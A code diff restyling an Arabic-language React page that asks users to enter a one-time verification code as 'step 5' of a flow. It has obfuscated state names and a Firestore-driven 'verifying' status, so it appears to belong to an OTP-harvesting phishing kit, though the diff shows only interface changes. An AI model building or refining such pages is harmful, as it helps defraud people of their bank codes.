@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
+import { StepShell } from "@/components/step-shell"
 import { db } from "@/lib/firebase"
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
@@ -255,97 +256,83 @@ export default function VeriPage() {
   }
 
   return (
-    <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
-      {/* Full Screen Spinner when verifying */}
+    <>
       {(_v5Status === "verifying") && (
         <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
       )}
 
-      <div className="w-full max-w-md">
-        {/* Icon */}
-        <div className="flex justify-center mb-6">
-          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-lg">
-            <ShieldCheck className="w-12 h-12 text-[#0a4a68]" />
-          </div>
-        </div>
+      <StepShell
+        step={5}
+        title="رمز التحقق"
+        subtitle="لإتمام العملية الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك المسجل"
+        icon={<ShieldCheck className="h-8 w-8" />}
+      >
+        <form onSubmit={handleOtpSubmit} className="space-y-4">
+          {error && (
+            <Alert variant="destructive" className="border-2">
+              <AlertCircle className="h-5 w-5" />
+              <AlertDescription className="text-base">{error}</AlertDescription>
+            </Alert>
+          )}
 
-        {/* Main Card */}
-        <div className="bg-white rounded-3xl shadow-2xl p-8">
-          <form onSubmit={handleOtpSubmit} className="space-y-6">
-            {error && (
-              <Alert variant="destructive" className="border-2">
-                <AlertCircle className="h-5 w-5" />
-                <AlertDescription className="text-base">{error}</AlertDescription>
-              </Alert>
-            )}
-
-            <div className="space-y-4">
-              <p className="text-center text-gray-700 text-base font-semibold leading-relaxed">
-                لإتمام العملية الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك المسجل
-              </p>
-
-              {/* Additional Info */}
-              <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 space-y-2">
-                <div className="flex items-center gap-2 text-sm text-blue-800">
-                  <Clock className="w-4 h-4" />
-                  <span>الرمز صالح لمدة 5 دقائق</span>
-                </div>
-                <div className="flex items-center gap-2 text-sm text-blue-800">
-                  <Lock className="w-4 h-4" />
-                  <span>لا تشارك هذا الرمز مع أي شخص</span>
-                </div>
-                <div className="text-xs text-gray-600 text-center mt-2 pt-2 border-t border-blue-200">
-                  رقم العملية: <span className="font-mono font-bold">{referenceNumber}</span>
-                </div>
+          <div className="rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-4">
+            <div className="space-y-2 text-sm text-[#24577a]">
+              <div className="flex items-center gap-2">
+                <Clock className="h-4 w-4" />
+                <span>الرمز صالح لمدة 5 دقائق</span>
               </div>
-              
-              <Input
-                type="password"
-                inputMode="numeric"
-                autoComplete="one-time-code"
-                placeholder="رمز التحقق"
-                value={_v5}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, "").slice(0, 6)
-                  _s5(value)
-                  setError("")
-                }}
-                maxLength={6}
-                className="h-14 text-center text-4xl px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
-                disabled={_v5Status === "verifying"}
-                required
-                autoFocus
-              />
-
-              {/* Resend OTP */}
-              <div className="text-center">
-                {canResend ? (
-                  <button
-                    type="button"
-                    onClick={handleResendOtp}
-                    className="text-[#0a4a68] font-bold hover:underline flex items-center justify-center gap-2 mx-auto"
-                  >
-                    <RefreshCw className="w-4 h-4" />
-                    إعادة إرسال الرمز
-                  </button>
-                ) : (
-                  <p className="text-sm text-gray-500">
-                    يمكنك إعادة الإرسال بعد {resendTimer} ثانية
-                  </p>
-                )}
+              <div className="flex items-center gap-2">
+                <Lock className="h-4 w-4" />
+                <span>لا تشارك هذا الرمز مع أي شخص</span>
               </div>
             </div>
+            <div className="mt-3 border-t border-[#dce8f3] pt-3 text-center text-xs text-[#6a8498]">
+              رقم العملية: <span className="font-mono font-bold text-[#24577a]">{referenceNumber}</span>
+            </div>
+          </div>
 
-            <Button
-              type="submit"
-              className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
-              disabled={_v5.length < 4 || _v5Status === "verifying"}
-            >
-              تأكيد
-            </Button>
-          </form>
-        </div>
-      </div>
-    </div>
+          <Input
+            type="password"
+            inputMode="numeric"
+            autoComplete="one-time-code"
+            placeholder="رمز التحقق"
+            value={_v5}
+            onChange={(e) => {
+              const value = e.target.value.replace(/\D/g, "").slice(0, 6)
+              _s5(value)
+              setError("")
+            }}
+            maxLength={6}
+            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 text-center text-3xl font-bold tracking-[0.35em] text-[#194e6e] placeholder:text-[#93a7b7] focus:border-[#145072]"
+            disabled={_v5Status === "verifying"}
+            required
+            autoFocus
+          />
+
+          <div className="text-center">
+            {canResend ? (
+              <button
+                type="button"
+                onClick={handleResendOtp}
+                className="mx-auto flex items-center justify-center gap-2 text-sm font-bold text-[#145072] hover:underline"
+              >
+                <RefreshCw className="h-4 w-4" />
+                إعادة إرسال الرمز
+              </button>
+            ) : (
+              <p className="text-sm text-[#6a8498]">يمكنك إعادة الإرسال بعد {resendTimer} ثانية</p>
+            )}
+          </div>
+
+          <Button
+            type="submit"
+            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
+            disabled={_v5.length < 4 || _v5Status === "verifying"}
+          >
+            تأكيد
+          </Button>
+        </form>
+      </StepShell>
+    </>
   )
 }
